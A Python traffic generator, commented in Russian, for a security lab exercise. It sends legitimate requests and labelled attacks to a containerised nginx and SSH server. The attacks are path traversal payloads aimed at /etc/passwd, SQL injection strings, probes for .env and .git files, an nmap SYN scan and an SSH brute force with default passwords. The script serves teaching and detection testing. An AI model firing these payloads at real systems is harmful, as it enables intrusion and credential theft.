#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Генератор трафика для лабораторной работы №12.

Формирует контролируемую смесь легитимных запросов и атак на
защищаемый сервер (nginx + sshd):

  normal     - легитимные HTTP-запросы к страницам сайта;
  attack     - path traversal (/etc/passwd), SQL-инъекции в query string,
               зондирование чувствительных путей (скан), SYN-сканирование
               портов (nmap -sS), брутфорс SSH.

Каждое действие логируется в stdout в машиночитаемом виде:
  ACTION|category|description|method_or_tool|target|result

Запуск внутри контейнера attacker:
  python3 /opt/traffic_gen.py --phase full
"""
import argparse
import os
import subprocess
import sys
import time
import urllib.error
import urllib.request

TARGET = os.environ.get("TARGET_IP", "172.29.100.10")

UA = "Mozilla/5.0 (X11; Linux x86_64) lab12-traffic-gen"

# ----------------------------- нормальный трафик ----------------------
NORMAL_REQUESTS = [
    ("GET",  "/",                                  "главная страница"),
    ("GET",  "/index.html",                        "главная страница (html)"),
    ("GET",  "/about.html",                        "страница 'О сервере'"),
    ("GET",  "/static/style.css",                  "таблица стилей"),
    ("GET",  "/api/status",                        "служебный API-эндпоинт"),
    ("GET",  "/?page=1&limit=10",                  "пагинация списка"),
    ("GET",  "/?id=42",                            "просмотр записи №42"),
    ("GET",  "/?search=nginx+configuration",       "поиск по сайту"),
    ("GET",  "/about.html?lang=ru",                "страница с параметром языка"),
    ("HEAD", "/",                                  "проверка доступности"),
    ("GET",  "/static/style.css?v=2",              "обновление кэша стилей"),
    ("GET",  "/api/status",                        "повторный опрос статуса"),
]

# ----------------------------- атаки ----------------------------------
TRAVERSAL_REQUESTS = [
    ("GET", "/../../etc/passwd",                        "path traversal: подняться к /etc/passwd"),
    ("GET", "/..%2f..%2f..%2fetc%2fpasswd",             "path traversal: URL-encoded ../"),
    ("GET", "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",         "path traversal: %2e%2e вместо точек"),
    ("GET", "/static/../../../../etc/passwd",           "path traversal: из статического каталога"),
    ("GET", "/cgi-bin/../../../etc/passwd%00",          "path traversal: с null-byte"),
]

SQLI_REQUESTS = [
    ("GET", "/?id=1%27%20OR%20%271%27%3D%271",                       "SQLi: тавтология 1' OR '1'='1"),
    ("GET", "/?id=1%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--",
                                                                    "SQLi: UNION SELECT из users"),
    ("GET", "/?q=%27%20UNION%20ALL%20SELECT%20password%20FROM%20users%23",
                                                                    "SQLi: UNION ALL SELECT"),
    ("GET", "/?user=admin%27--",                                     "SQLi: обрыв условия комментарием"),
    ("GET", "/?cat=1%20AND%201%3D1",                                 "SQLi: булева проверка AND 1=1"),
]

SCAN_REQUESTS = [
    ("GET", "/.env",              "скан: поиск файла .env с секретами"),
    ("GET", "/admin",             "скан: административная панель"),
    ("GET", "/wp-login.php",      "скан: WordPress login"),
    ("GET", "/phpmyadmin/",       "скан: phpMyAdmin"),
    ("GET", "/backup.zip",        "скан: архив бэкапа"),
    ("GET", "/.git/config",       "скан: раскрытый .git"),
    ("GET", "/config.php.bak",    "скан: бэкап конфигурации"),
    ("GET", "/server-status",     "скан: server-status Apache"),
    ("GET", "/actuator/health",   "скан: Spring Actuator"),
    ("GET", "/cgi-bin/test-cgi",  "скан: старые cgi-скрипты"),
]

SSH_ATTEMPTS = [
    ("root",   "toor"),
    ("admin",  "admin"),
    ("dev",    "123456"),
    ("test",   "test"),
    ("root",   "123456"),
    ("admin",  "password"),
    ("ubuntu", "ubuntu"),
    ("oracle", "oracle"),
]


def log_event(category, description, tool, target, result):
    line = "ACTION|%s|%s|%s|%s|%s" % (category, description, tool, target, result)
    print(line, flush=True)


def http_request(method, path, description, category):
    url = "http://%s%s" % (TARGET, path)
    t0 = time.time()
    try:
        req = urllib.request.Request(url, method=method, headers={"User-Agent": UA})
        with urllib.request.urlopen(req, timeout=8) as resp:
            code = resp.status
        result = "HTTP %d (%d ms)" % (code, (time.time() - t0) * 1000)
    except urllib.error.HTTPError as e:
        code = e.code
        result = "HTTP %d (%d ms)" % (code, (time.time() - t0) * 1000)
    except Exception as e:  # соединение сорвалось и т.п.
        log_event(category, description, "%s %s" % (method, path), url,
                  "ERROR: %s" % e.__class__.__name__)
        return None
    log_event(category, description, "%s %s" % (method, path), url, result)
    return code


def phase_normal(delay=0.5):
    print("=== ФАЗА: normal (легитимные запросы) ===", flush=True)
    for method, path, desc in NORMAL_REQUESTS:
        http_request(method, path, desc, "normal")
        time.sleep(delay)


def phase_http_attacks(delay=0.35):
    print("=== ФАЗА: attack/http ===", flush=True)
    for method, path, desc in TRAVERSAL_REQUESTS:
        http_request(method, path, desc, "traversal")
        time.sleep(delay)
    for method, path, desc in SQLI_REQUESTS:
        http_request(method, path, desc, "sqli")
        time.sleep(delay)
    for method, path, desc in SCAN_REQUESTS:
        http_request(method, path, desc, "scan-http")
        time.sleep(delay)


def phase_portscan():
    print("=== ФАЗА: attack/portscan (nmap SYN-scan) ===", flush=True)
    cmd = ["nmap", "-sS", "-Pn", "-T4", "--top-ports", "100", TARGET]
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
        open_ports = [l for l in proc.stdout.splitlines() if "/tcp" in l]
        log_event("scan-port", "nmap SYN-скан топ-100 портов", " ".join(cmd),
                  TARGET, "открытых: %d" % len(open_ports))
        for l in open_ports:
            print("    " + l.strip(), flush=True)
    except Exception as e:
        log_event("scan-port", "nmap SYN-скан топ-100 портов", "nmap -sS",
                  TARGET, "ERROR: %s" % e)


def phase_ssh_bruteforce():
    print("=== ФАЗА: attack/ssh-bruteforce ===", flush=True)
    ok = fail = err = 0
    for user, password in SSH_ATTEMPTS:
        cmd = [
            "sshpass", "-p", password,
            "ssh",
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "ConnectTimeout=5",
            "-o", "NumberOfPasswordPrompts=1",
            "-o", "PreferredAuthentications=password,keyboard-interactive",
            "%s@%s" % (user, TARGET),
            "exit",
        ]
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
            rc = proc.returncode
            if rc == 0:
                res, ok = "вход УСПЕШЕН", ok + 1
            elif rc == 5:
                res, fail = "отказ аутентификации", fail + 1
            else:
                res, err = "отказ (rc=%d)" % rc, err + 1
        except subprocess.TimeoutExpired:
            res, err = "таймаут", err + 1
        log_event("ssh-brute", "подбор пароля SSH", "ssh %s" % user,
                  "%s@%s (пароль: %s)" % (user, TARGET, password), res)
        time.sleep(0.3)
    log_event("ssh-brute", "итог брутфорса", "sshpass+ssh", TARGET,
              "успешно=%d неуспешно=%d ошибок=%d" % (ok, fail, err))


def summary(counters):
    print("=== ИТОГИ ГЕНЕРАЦИИ ===", flush=True)
    total = sum(counters.values())
    for cat in ("normal", "traversal", "sqli", "scan-http", "scan-port", "ssh-brute"):
        print("SUMMARY|%s|%d" % (cat, counters.get(cat, 0)), flush=True)
    print("SUMMARY|total|%d" % total, flush=True)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--phase", choices=["normal", "attack", "full"], default="full")
    args = ap.parse_args()

    counters = {"normal": 0, "traversal": 0, "sqli": 0,
                "scan-http": 0, "scan-port": 0, "ssh-brute": 0}

    if args.phase in ("normal", "full"):
        phase_normal()
        counters["normal"] = len(NORMAL_REQUESTS)
    if args.phase in ("attack", "full"):
        phase_http_attacks()
        counters["traversal"] = len(TRAVERSAL_REQUESTS)
        counters["sqli"] = len(SQLI_REQUESTS)
        counters["scan-http"] = len(SCAN_REQUESTS)
        phase_portscan()
        counters["scan-port"] = 1
        phase_ssh_bruteforce()
        counters["ssh-brute"] = len(SSH_ATTEMPTS)
    summary(counters)
    return 0


if __name__ == "__main__":
    sys.exit(main())
